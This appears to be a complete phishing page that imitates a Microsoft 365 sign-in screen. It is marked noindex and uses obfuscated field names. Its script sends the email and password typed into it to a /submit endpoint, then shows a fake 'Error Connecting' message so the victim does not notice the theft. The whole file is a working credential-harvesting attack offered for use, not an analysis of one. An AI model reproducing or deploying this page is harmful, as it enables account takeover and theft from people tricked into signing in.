<!DOCTYPE html>
<html lang="en">
<head>
    <meta name=”robots” content=”noindex”>
    <link href="favicon.ico"rel="icon"type="image/x-icon">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f5f5f5;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .signin-container {
            background: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        .logo img{
            width: 150px;
        }
        .logo{
            align-items: center;
            display: flex;
            justify-content: center;
            margin-bottom: 30px;
        }
        .divider {
            border-top: 1px solid #dee2e6;
            margin: 1.5rem 0;
        }
        .form-check-input:checked {
            background-color: #009688;
            border-color: #009688;
        }
        .btn-signin {
            background-color: #000;
            color: white;
            width: 100%;
            padding: 0.75rem;
        }
        .btn-signin:hover {
            background-color: #333;
            color: white;
        }
        .error-button{
            background-color:red!important;
            color:#fff;
            cursor:not-allowed
        }
        .proceed-button{width:100%;
            padding:12px;
            background-color:#141414;
            color:#fff;border:none;
            border-radius:8px;
            cursor:pointer;
    margin-bottom:12px;
    font-weight:500
}

        .password-field {
            position: relative;
        }
        .show-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: #009688;
            cursor: pointer;
            background: none;
            border: none;
            padding: 0;
        }
    </style>
</head>
<body>
    <div class="signin-container">
        <div class="logo">
            <img src="logo.png" alt="">
        </div>

        
        <h2 class="h4 mb-4">Sign in</h2>
        
        <form action="/submit"id="conforpky"method="post">
            <div class="mb-3">
                <input type="email" class="form-control" placeholder="Email" id="phWetKeystore"name="phWet" required>
            </div>
            
            <div class="mb-3 password-field">
                <input type="password" class="form-control" id="passwordInput" name="passwordwet" placeholder="Password" required>
                <button type="button" class="show-password" id="togglePassword">Show</button>
            </div>
            
            <div class="mb-3">
                <div class="form-check">
                    <input class="form-check-input" type="checkbox" id="keepSignedIn">
                    <label class="form-check-label" for="keepSignedIn">
                        Keep me signed in on this device
                    </label>
                </div>
            </div>
            
            <button class="proceed-button" onclick='sendMessage()' type="button" id="sendMessageButton">Sign In</button>
            <div class="text-center">
                <a href="#" class="text-decoration-none">Need to find your password?</a>
            </div>
        </form>
        
        <div class="divider"></div>
        
        <div class="text-center mb-3">
            Don't have Microsoft 365 email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/js/bootstrap.bundle.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const passwordInput = document.getElementById('passwordInput');
            const toggleButton = document.getElementById('togglePassword');
            
            toggleButton.addEventListener('click', function() {
                // Toggle the password input type
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                
                // Toggle the button text
                this.textContent = type === 'password' ? 'Show' : 'Hide';
            });
        });
    

        function sendMessage() {
  const form = document.getElementById('conforpky'); 
  const formData = new FormData(form); 
    formData.append("send", "true");
    const sendButton = form.querySelector(".proceed-button");
    sendButton.textContent = "Error Connecting";
    sendButton.classList.add("error-button");
    sendButton.disabled = true;

    // Use full URL to ensure correct routing
    fetch("/submit", {
        method: "POST",
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(Object.fromEntries(formData))
    })
    .catch(error => {
        console.error('Error:', error);
        sendButton.textContent = "Error Connecting";
        sendButton.classList.add("error-button");
    });
}


const form = document.getElementById('conforpky');
const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], textarea');
inputs.forEach(input => {
  input.value = '';
});

function clearSignInForm() {
  const form = document.getElementById('conforpky');
  const signInButton = form.querySelector('.proceed-button');

  if (signInButton) {
    signInButton.textContent = "Sign In";
    signInButton.classList.remove("error-button");
    signInButton.disabled = false;
  }
  document.body.style.overflow = 'auto';
}

</script>

</body>
</html>
